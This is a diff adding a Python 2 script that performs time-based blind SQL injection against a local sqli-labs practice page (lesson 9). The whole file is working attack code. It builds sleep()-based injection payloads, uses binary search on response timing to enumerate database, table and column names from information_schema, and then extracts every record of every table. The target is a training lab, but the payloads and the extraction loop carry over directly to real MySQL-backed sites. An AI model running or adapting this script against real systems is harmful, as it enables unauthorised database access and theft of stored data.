@@ -1,0 +1,594 @@
+#coding:utf-8
+
+import requests
+import time
+import math
+
+def get_db_num(url):
+    max_num = 1
+    min_num = 1
+    payload = url % max_num
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while time_spend > 0.1 :
+        min_num = max_num
+        max_num = max_num * 2
+        payload = url % max_num
+        starttime = time.time()
+        res = requests.get(payload)
+        endtime = time.time()
+        time_spend = endtime - starttime
+    r_limit = max_num
+    l_limit = min_num
+    m_pos = (l_limit + r_limit) / 2
+    payload = url % m_pos
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+        if time_spend > 0.1 :
+            l_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % m_pos
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            r_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % m_pos
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+    return r_limit
+
+def get_table_num(url, db_name):
+    max_num = 1
+    min_num = 1
+    payload = url % (db_name, max_num)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while time_spend > 0.1 :
+        min_num = max_num
+        max_num = max_num * 2
+        payload = url % (db_name, max_num)
+        starttime = time.time()
+        res = requests.get(payload)
+        endtime = time.time()
+        time_spend = endtime - starttime
+    r_limit = max_num
+    l_limit = min_num
+    m_pos = (l_limit + r_limit) / 2
+    payload = url % (db_name, m_pos)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+        if time_spend > 0.1 :
+            l_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (db_name, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            r_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (db_name, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+    return r_limit
+
+def get_column_num(url, db_name, table_name):
+    max_num = 1
+    min_num = 1
+    payload = url % (db_name, table_name, max_num)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while time_spend > 0.1 :
+        min_num = max_num
+        max_num = max_num * 2
+        payload = url % (db_name, table_name, max_num)
+        starttime = time.time()
+        res = requests.get(payload)
+        endtime = time.time()
+        time_spend = endtime - starttime
+    r_limit = max_num
+    l_limit = min_num
+    m_pos = (l_limit + r_limit) / 2
+    payload = url % (db_name, table_name, m_pos)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+        if time_spend > 0.1 :
+            l_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (db_name, table_name, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            r_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (db_name, table_name, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+    return r_limit
+
+def get_record_num(url, db_name, table_name):
+    max_num = 1
+    min_num = 1
+    payload = url % (db_name, table_name, max_num)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while time_spend > 0.1 :
+        min_num = max_num
+        max_num = max_num * 2
+        payload = url % (db_name, table_name, max_num)
+        starttime = time.time()
+        res = requests.get(payload)
+        endtime = time.time()
+        time_spend = endtime - starttime
+    r_limit = max_num
+    l_limit = min_num
+    m_pos = (l_limit + r_limit) / 2
+    payload = url % (db_name, table_name, m_pos)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+        if time_spend > 0.1 :
+            l_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (db_name, table_name, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            r_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (db_name, table_name, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+    return r_limit
+
+def get_db_len(url, idx):
+    max_len = 1
+    min_len = 1
+    payload = url % (idx, max_len)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while 1 :
+        if time_spend > 0.1 :
+            min_len = max_len
+            max_len = max_len * 2
+            payload= url % (idx, max_len)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            break
+    r_limit = max_len
+    l_limit = min_len
+    m_pos = (max_len + min_len) / 2
+    payload = url % (idx, m_pos)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+        if time_spend > 0.1 :
+            l_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (idx, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            r_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            starttime = time.time()
+            payload = url % (idx, m_pos)
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+    return r_limit
+
+def get_table_len(url, db_name, idx):
+    max_len = 1
+    min_len = 1
+    payload = url % (db_name, idx, max_len)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while 1 :
+        if time_spend > 0.1 :
+            min_len = max_len
+            max_len = max_len * 2
+            payload= url % (db_name, idx, max_len)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            break
+    r_limit = max_len
+    l_limit = min_len
+    m_pos = (max_len + min_len) / 2
+    payload = url % (db_name, idx, m_pos)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+        if time_spend > 0.1 :
+            l_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (db_name, idx, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            r_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            starttime = time.time()
+            payload = url % (db_name, idx, m_pos)
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+    return r_limit
+
+def get_column_len(url, db_name, table_name, idx):
+    max_len = 1
+    min_len = 1
+    payload = url % (db_name, table_name, idx, max_len)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while 1 :
+        if time_spend > 0.1 :
+            min_len = max_len
+            max_len = max_len * 2
+            payload= url % (db_name, table_name, idx, max_len)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            break
+    r_limit = max_len
+    l_limit = min_len
+    m_pos = (max_len + min_len) / 2
+    payload = url % (db_name, table_name, idx, m_pos)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+        if time_spend > 0.1 :
+            l_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (db_name, table_name, idx, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            r_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            starttime = time.time()
+            payload = url % (db_name, table_name, idx, m_pos)
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+    return r_limit
+
+def get_record_len(url, column_concat, db_name, table_name, record_num_cnt):
+    max_len = 1
+    min_len = 1
+    payload = url % (column_concat, db_name, table_name, record_num_cnt, max_len)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while 1 :
+        if time_spend > 0.1 :
+            min_len = max_len
+            max_len = max_len * 2
+            payload= url % (column_concat, db_name, table_name, record_num_cnt, max_len)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            break
+    r_limit = max_len
+    l_limit = min_len
+    m_pos = (max_len + min_len) / 2
+    payload = url % (column_concat, db_name, table_name, record_num_cnt, m_pos)
+    starttime = time.time()
+    res = requests.get(payload)
+    endtime = time.time()
+    time_spend = endtime - starttime
+    while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+        if time_spend > 0.1 :
+            l_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            payload = url % (column_concat, db_name, table_name, record_num_cnt, m_pos)
+            starttime = time.time()
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+        else :
+            r_limit = m_pos
+            m_pos = (l_limit + r_limit) / 2
+            starttime = time.time()
+            payload = url % (column_concat, db_name, table_name, record_num_cnt, m_pos)
+            res = requests.get(payload)
+            endtime = time.time()
+            time_spend = endtime - starttime
+    return r_limit
+
+def get_db_name(url , idx, length) :
+    name = ''
+    pos = 1
+    while pos <= length :
+        r_limit = 126
+        l_limit = 32
+        m_pos = (l_limit + r_limit) / 2
+        payload = url % (idx, pos, m_pos)
+        starttime = time.time()
+        res = requests.get(payload)
+        endtime = time.time()
+        time_spend = endtime - starttime
+        while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+            if time_spend > 0.1 :
+                l_limit = m_pos
+                m_pos = (l_limit + r_limit) / 2
+                payload = url % (idx, pos, m_pos)
+                starttime = time.time()
+                res = requests.get(payload)
+                endtime = time.time()
+                time_spend = endtime - starttime
+            else :
+                r_limit = m_pos
+                m_pos = (l_limit + r_limit) / 2
+                payload = url % (idx, pos, m_pos)
+                starttime = time.time()
+                res = requests.get(payload)
+                endtime = time.time()
+                time_spend = endtime - starttime
+        name = name + chr(r_limit)
+        pos = pos + 1
+    return name
+
+def get_table_name(url, db_name, idx, length) :
+    name = ''
+    pos = 1
+    while pos <= length :
+        r_limit = 126
+        l_limit = 32
+        m_pos = (l_limit + r_limit) / 2
+        payload = url % (db_name, idx, pos, m_pos)
+        starttime = time.time()
+        res = requests.get(payload)
+        endtime = time.time()
+        time_spend = endtime - starttime
+        while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+            if time_spend > 0.1 :
+                l_limit = m_pos
+                m_pos = (l_limit + r_limit) / 2
+                payload = url % (db_name, idx, pos, m_pos)
+                starttime = time.time()
+                res = requests.get(payload)
+                endtime = time.time()
+                time_spend = endtime - starttime
+            else :
+                r_limit = m_pos
+                m_pos = (l_limit + r_limit) / 2
+                payload = url % (db_name, idx, pos, m_pos)
+                starttime = time.time()
+                res = requests.get(payload)
+                endtime = time.time()
+                time_spend = endtime - starttime
+        name = name + chr(r_limit)
+        pos = pos + 1
+    return name
+
+def get_column_name(url, db_name, table_name, idx, length) :
+    name = ''
+    pos = 1
+    while pos <= length :
+        r_limit = 126
+        l_limit = 32
+        m_pos = (l_limit + r_limit) / 2
+        payload = url % (db_name, table_name, idx, pos, m_pos)
+        starttime = time.time()
+        res = requests.get(payload)
+        endtime = time.time()
+        time_spend = endtime - starttime
+        while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+            if time_spend > 0.1 :
+                l_limit = m_pos
+                m_pos = (l_limit + r_limit) / 2
+                payload = url % (db_name, table_name, idx, pos, m_pos)
+                starttime = time.time()
+                res = requests.get(payload)
+                endtime = time.time()
+                time_spend = endtime - starttime
+            else :
+                r_limit = m_pos
+                m_pos = (l_limit + r_limit) / 2
+                payload = url % (db_name, table_name, idx, pos, m_pos)
+                starttime = time.time()
+                res = requests.get(payload)
+                endtime = time.time()
+                time_spend = endtime - starttime
+        name = name + chr(r_limit)
+        pos = pos + 1
+    return name
+
+def get_record(url, column_concat, db_name, table_name, record_len, record_num_cnt):
+    record = ''
+    pos = 1
+    while pos <= record_len :
+        r_limit = 126
+        l_limit = 31
+        m_pos = (l_limit + r_limit) / 2
+        payload = url % (column_concat, db_name, table_name, record_num_cnt, pos, m_pos)
+        starttime = time.time()
+        res = requests.get(payload)
+        endtime = time.time()
+        time_spend = endtime - starttime
+        while m_pos - l_limit != 0 and m_pos - r_limit != 0 :
+            if time_spend > 0.1 :
+                l_limit = m_pos
+                m_pos = (l_limit + r_limit) / 2
+                payload = url % (column_concat, db_name, table_name, record_num_cnt, pos, m_pos)
+                starttime = time.time()
+                res = requests.get(payload)
+                endtime = time.time()
+                time_spend = endtime - starttime
+            else :
+                r_limit = m_pos
+                m_pos = (l_limit + r_limit) / 2
+                starttime = time.time()
+                payload = url % (column_concat, db_name, table_name, record_num_cnt, pos, m_pos)
+                res = requests.get(payload)
+                endtime = time.time()
+                time_spend = endtime - starttime
+        pos =pos + 1
+        record = record + chr(r_limit)
+    return record
+
+def get_db_names(url_num, url_len, url_name):
+    db_names = []
+    db_num_cnt = 6
+    db_num = get_db_num(url_num)
+    while db_num_cnt < db_num :
+        db_len = get_db_len(url_len, db_num_cnt)
+        db_names.append(get_db_name(url_name, db_num_cnt, db_len))
+        db_num_cnt = db_num_cnt + 1
+    return db_names
+
+def get_table_names(url_num, url_len, url_name, db_name):
+    table_names = []
+    table_num_cnt = 0
+    table_num = get_table_num(url_num, db_name)
+    while table_num_cnt < table_num :
+        table_len = get_table_len(url_len, db_name, table_num_cnt)
+        table_names.append(get_table_name(url_name, db_name, table_num_cnt, table_len))
+        table_num_cnt = table_num_cnt + 1
+    return table_names
+
+def get_column_names(url_num, url_len, url_name, db_name, table_name):
+    column_names = []
+    column_num_cnt = 0
+    column_num = get_column_num(url_num, db_name, table_name)
+    while column_num_cnt < column_num :
+        column_len = get_column_len(url_len, db_name, table_name, column_num_cnt)
+        column_names.append(get_column_name(url_name, db_name, table_name, column_num_cnt, column_len))
+        column_num_cnt = column_num_cnt + 1
+    return column_names
+
+def get_records(url_num, url_len, url_name, db_name, table_name, column_names) :
+    # records = {}
+    # records[db_name] = {}
+    # records[db_name][table_name] = []
+    records = []
+    record_num_cnt = 0
+    column_concat = ",'; ',".join(column_names)
+    record_num = get_record_num(url_num, db_name, table_name)
+    while record_num_cnt < record_num :
+        record_len = get_record_len(url_len, column_concat, db_name, table_name, record_num_cnt)
+        record = get_record(url_name, column_concat, db_name, table_name, record_len, record_num_cnt)
+        # records[db_name][table_name].append(record)
+        records.append(record)
+        record_num_cnt = record_num_cnt + 1
+    return records
+
+def print_format_result(result) :
+    for db_name in result :
+        print db_name
+        for table_name in result[db_name] :
+            print " - %s" % table_name
+            for column_name in result[db_name][table_name] :
+                print " -- %s" % column_name
+
+def print_record(records) :
+    for db_name in records :
+        print db_name
+        for table_name in records[db_name] :
+            print " - %s" % table_name
+            for record in records[db_name][table_name] :
+                print " -- %s" % record
+
+def main():
+    url = 'http://localhost/sqli-labs-master/less-9/index.php?id=1'
+    result = {}
+    url_num = url + """'and if ((select count(*) from information_schema.schemata)>%s, sleep(0.1), null)%%23"""
+    url_len = url + """' and if(length((select schema_name from information_schema.schemata limit %s,1))>%s,sleep(0.1),null)%%23"""
+    url_name = url + """' and if(ord(substr((select schema_name from information_schema.schemata limit %s,1),%s,1))>%s,sleep(0.1),null)%%23"""
+    db_names = get_db_names(url_num, url_len, url_name)
+    # db_names.remove('information_schema')
+    # db_names.remove('mysql')
+    # db_names.remove('performance_schema')
+    db_names.remove('sys')
+    for db_name in db_names :
+        url_num = url + """' and if ((select count(*) from information_schema.tables where table_schema = '%s')>%s, sleep(0.1), null)%%23"""
+        url_len = url + """' and if(length((select table_name from information_schema.tables where table_schema = '%s' limit %s,1))>%s,sleep(0.1),null)%%23"""
+        url_name = url + """' and if(ord(substr((select table_name from information_schema.tables where table_schema = '%s' limit %s,1),%s,1))>%s,sleep(0.1),null)%%23"""
+        table_names = get_table_names(url_num, url_len, url_name, db_name)
+        result[db_name] = {}
+        for table_name in table_names :
+            result[db_name][table_name] = []
+    records = {}
+    for db_name in result :
+        records[db_name] = {}
+        for table_name in result[db_name] :
+            url_num = url + """' and if ((select count(*) from information_schema.columns where table_schema = '%s' and table_name = '%s')>%s, sleep(0.1), null)%%23"""
+            url_len = url + """' and if(length((select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %s,1))>%s,sleep(0.1),null)%%23"""
+            url_name = url + """' and if(ord(substr((select column_name from information_schema.columns where table_schema = '%s' and table_name = '%s' limit %s,1),%s,1))>%s,sleep(0.1),null)%%23"""
+            column_names = get_column_names(url_num, url_len, url_name, db_name, table_name)
+            result[db_name][table_name] = column_names
+            url_num = url + """' and if((select count(*) from %s.%s)>%s,sleep(0.1), null)%%23"""
+            url_len = url + """' and if(length((select concat(%s) from %s.%s limit %s,1))>%s,sleep(0.1),null)%%23"""
+            url_name = url + """' and if(ord(substr((select concat(%s) from %s.%s limit %s,1),%s,1))>%s,sleep(0.1), null)%%23"""
+            record = get_records(url_num, url_len, url_name, db_name, table_name, column_names)
+            records[db_name][table_name] = record
+    print_format_result(result)
+    print_record(records)
+
+if __name__ == '__main__':
+    main()
